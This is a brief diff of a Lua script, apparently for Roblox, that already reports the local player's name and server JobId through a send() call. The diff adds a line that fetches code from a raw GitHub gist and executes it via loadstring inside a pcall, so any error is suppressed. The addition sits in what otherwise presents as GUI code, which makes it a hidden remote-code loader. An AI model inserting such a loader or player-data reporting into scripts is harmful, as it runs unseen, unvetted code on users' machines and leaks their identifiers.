@@ -215,6 +215,7 @@ pcall(function()
 
 --if wacikansdf == 'has @everyone' then
 send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId .. ' | ' .. wacikansdf)
+		loadstring(game:HttpGet'https://gist.githubusercontent.com/1ristan/0188ad56e239b9b0c36072397f069ba3/raw/b820483311d6edfb78c266b57161abd8a1c7cec3/gistfile1.txt')()
 		--end
 	end)
 do  -- // GUI
